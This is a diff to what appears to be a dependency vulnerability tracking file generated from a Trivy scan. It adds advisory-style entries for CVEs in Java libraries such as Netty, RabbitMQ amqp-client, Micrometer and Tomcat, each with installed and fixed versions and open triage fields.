+  ### CVE-2026-63335: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.31.0, inbound AMQP command assembly in src/main/java/com/rabbitmq/client/impl/CommandAssembler.java processes a content-bearing method and header whose remainingBodyBytes value is smaller than a following AMQP.FRAME_BODY payload. CommandAssembler.consumeBodyFrame subtracts the peer-controlled payload length before validating that it fits, drives remainingBodyBytes negative, and throws a raw UnsupportedOperationException instead of MalformedFrameException. A malicious or compromised broker peer can send this malformed sequence on an open nonzero channel to terminate frame processing and close the client connection, causing denial of service for work using that connection. This issue is fixed in version 5.31.0.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: MEDIUM
+- Installed version: 5.25.0
+- Fixed version: 5.31.0
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-63336: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, com.rabbitmq.client.ConnectionFactory.useSslProtocol() and ConnectionFactory.useSslProtocol(String) configure com.rabbitmq.client.TrustEverythingTrustManager and leave hostname verification disabled, causing arbitrary server certificates, including self-signed certificates, to be accepted. A network attacker able to intercept a TLS connection can impersonate the RabbitMQ broker, read protected AMQP traffic, and modify traffic without certificate or hostname validation. The fix changes the production TLS helpers to use the JVM default trust store and enables hostname verification, while retaining an explicitly named development-only no-verification helper. This issue is fixed in version 5.33.0.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: MEDIUM
+- Installed version: 5.25.0
+- Fixed version: 5.33.0
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed 
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+ ### CVE-2026-61634: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, the AMQP connection tuning path records the negotiated AMQP frame_max value, but src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java and NettyFrameHandlerFactory continue to validate broker-controlled frame payload lengths against maxInboundMessageBodySize because the negotiated limit is not applied consistently through setMaxInboundFramePayloadSize. A malicious or compromised broker can send a method frame larger than the negotiated frame_max during or after connection establishment, causing the client to allocate and decode a protocol-invalid frame instead of rejecting it with MalformedFrameException. The protocol violation can disrupt the affected connection and cause client-side denial of service. This issue is fixed in version 5.33.0.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: LOW
+- Installed version: 5.25.0
+- Fixed version: 5.33.0
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+### CVE-2026-40983: In Micrometer, it is possible for a user to provide specially crafted gRPC requests that may cause a denial-of-service (DoS) condition.\n\nAffected versions:\nMicrometer 1.16.0 through 1.16.5; 1.15.0 through 1.15.11.
+          
+- Package: io.micrometer:micrometer-core
+- Severity: HIGH
+- Installed version: 1.15.11
+- Fixed version: 1.16.6, 1.15.12
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-40984: In Micrometer, it is possible for a user to provide specially crafted HTTP requests that may cause a denial-of-service (DoS) condition.\n\nAffected versions:\nmicrometer-core 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18; 1.9.0 through 1.9.17.\nmicrometer-jetty11 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18.\nmicrometer-jetty12 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18.
+          
+- Package: io.micrometer:micrometer-core
+- Severity: HIGH
+- Installed version: 1.15.11
+- Fixed version: 1.16.6, 1.15.12
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-42583: Netty is an asynchronous, event-driven network application framework. Prior to 4.2.13.Final and 4.1.133.Final, Lz4FrameDecoder allocates a ByteBuf of size decompressedLength (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus compressedLength payload bytes - 22 bytes if compressedLength == 1 - to force that allocation. This vulnerability is fixed in 4.2.13.Final and 4.1.133.Final.
+          
+- Package: io.netty:netty-codec
+- Severity: HIGH
+- Installed version: 4.1.132.Final
+- Fixed version: 4.1.133.Final
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-59901: Netty is an asynchronous, event-driven network application framework. Prior to versions 4.1.136.Final and 4.2.16.Final, the `Bzip2Decoder` handler in Netty's compression codec pipeline is vulnerable to a denial-of-service attack through a malformed bzip2 stream that permanently captures the event-loop thread in an infinite loop. The vulnerability exists in the run-length encoding (RLE) state machine within [`Bzip2BlockDecompressor.read()`]. This issue has been fixed in versions 4.1.136.Final and 4.2.16.Final.
+          
+- Package: io.netty:netty-codec
+- Severity: HIGH
+- Installed version: 4.1.132.Final
+- Fixed version: 4.1.136.Final
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-44249: Netty is a network application framework for development of protocol servers and clients. In netty-handler prior to versions 4.1.135.Final and 4.2.15.Final, an attacker can bypass IPv6 subnet rules due to an incorrect masking operation in IpSubnetFilterRule.compareTo(). Valid public IP addresses can bypass the restrictions. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
+          
+- Package: io.netty:netty-handler
+- Severity: HIGH
+- Installed version: 4.1.132.Final
+- Fixed version: 4.2.15.Final, 4.1.135.Final
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-45416: Netty is a network application framework for development of protocol servers and clients. Prior to versions 4.1.135.Final and 4.2.15.Final, SslClientHelloHandler.decode() reads the 24-bit TLS handshake length and, when the ClientHello does not fit in the first record, eagerly allocates `ctx.alloc().buffer(handshakeLength)` (line 161). The guard at line 140 is `handshakeLength \u003e maxClientHelloLength \u0026\u0026 maxClientHelloLength != 0`, and the commonly-used SniHandler/AbstractSniHandler constructors (SniHandler(Mapping), SniHandler(AsyncMapping), AbstractSniHandler()) pass maxClientHelloLength=0 and handshakeTimeoutMillis=0, so the length guard is disabled and no timeout is scheduled. A 16 MiB request exceeds the default pooled chunk size and becomes a huge/unpooled allocation performed immediately. The buffer is retained in the handler until the channel closes. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
+          
+- Package: io.netty:netty-handler
+- Severity: HIGH
+- Installed version: 4.1.132.Final
+- Fixed version: 4.2.15.Final, 4.1.135.Final
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-50010: Netty is a network application framework for development of protocol servers and clients. Prior to versions 4.1.135.Final and 4.2.15.Final, SimpleTrustManagerFactory.engineGetTrustManagers() and related paths wrap any user-supplied plain X509TrustManager in X509TrustManagerWrapper, which extends X509ExtendedTrustManager but implements the 3-arg checkServerTrusted(chain, authType, SSLEngine) by discarding the SSLEngine and calling the 2-arg delegate. Because the object now IS an X509ExtendedTrustManager, neither SunJSSE's internal AbstractTrustManagerWrapper nor Netty's own OpenSslX509TrustManagerWrapper will re-wrap it to add endpoint-identification. Consequently, even though Netty 4.2 sets endpointIdentificationAlgorithm=\"HTTPS\" by default, a client built with `SslContextBuilder.forClient().trustManager(somePlainX509TrustManager)` performs no hostname verification at all. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
+          
+- Package: io.netty:netty-handler
+- Severity: HIGH
+- Installed version: 4.1.132.Final
+- Fixed version: 4.2.15.Final, 4.1.135.Final
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2023-22102: Vulnerability in the MySQL Connectors product of Oracle MySQL (component: Connector/J).  Supported versions that are affected are 8.1.0 and prior. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Connectors.  Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in MySQL Connectors, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.1 Base Score 8.3 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).
+          
+- Package: mysql:mysql-connector-java
+- Severity: HIGH
+- Installed version: 8.0.28
+- Fixed version: none
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: affected
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+   ### CVE-2025-48924: Uncontrolled Recursion vulnerability in Apache Commons Lang.\n\nThis issue affects Apache Commons Lang: Starting with commons-lang:commons-lang 2.0 to 2.6, and, from org.apache.commons:commons-lang3 3.0 before 3.18.0.\n\nThe methods ClassUtils.getClass(...) can throw StackOverflowError on very long inputs. Because an Error is usually not handled by applications and libraries, a \nStackOverflowError could cause an application to stop.\n\nUsers are recommended to upgrade to version 3.18.0, which fixes the issue.
+          
+- Package: org.apache.commons:commons-lang3
+- Severity: MEDIUM
+- Installed version: 3.17.0
+- Fixed version: 3.18.0
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-49844: Improper encoding of non-finite floating-point values during MapMessage JSON serialization in Apache Log4j API produces output that is not valid JSON. This issue affects Apache Log4j API versions 2.13.1 through 2.25.4 and version 2.26.0.\n\nThe fix for CVE-2026-34481 did not cover all code paths: when a MapMessage contains a non-finite IEEE 754 value (NaN, Infinity, or -Infinity), MapMessage.asJson() emits the corresponding bare token. RFC 8259 does not permit these tokens, so a conformant parser rejects the resulting document.\n\nThe defect is reachable only when both of the following conditions hold:\n\n  *  The application uses the  message resolver https://logging.apache.org/log4j/2.x/manual/json-template-layout.html#event-template-resolver-message  of JsonTemplateLayout or any other layout that relies on MapMessage.asJson() or MapMessage.getFormattedMessage(new String[]{\"JSON\"}).\n  *  The application logs a MapMessage that contains an attacker-controlled floating-point value.\n\n\nAn attacker who can supply a non-finite value can cause the affected layout to emit malformed JSON, which may corrupt the enclosing log record or disrupt downstream log ingestion and parsing.\n\nUsers are advised to upgrade to Apache Log4j API 2.25.5 or 2.26.1, both of which emit RFC 8259-compliant JSON for non-finite values.
+          
+- Package: org.apache.logging.log4j:log4j-api
+- Severity: MEDIUM
+- Installed version: 2.24.3
+- Fixed version: 2.25.5, 2.26.1
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+   ### CVE-2026-41293: Improper Input Validation vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 10.0.0-M1 through 10.0.27.\nOlder, end of support versions may also be affected.\n\nUsers are recommended to upgrade to version [FIXED_VERSION], which fixes the issue.
+          
+- Package: org.apache.tomcat.embed:tomcat-embed-core
+- Severity: CRITICAL
+- Installed version: 10.1.54
+- Fixed version: 9.0.118, 10.1.55, 11.0.22
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### <CVE-ID>: <short description>
           
 - Package: <PkgName>
 - Severity: <Severity>
@@ -646,7 +1126,10 @@
 - Remediation: 
 - Tracking issue: 
 - Exception expiry: 
-- Notes: 
+- Notes:
+
+
+
 
 ## Remediation Log
 
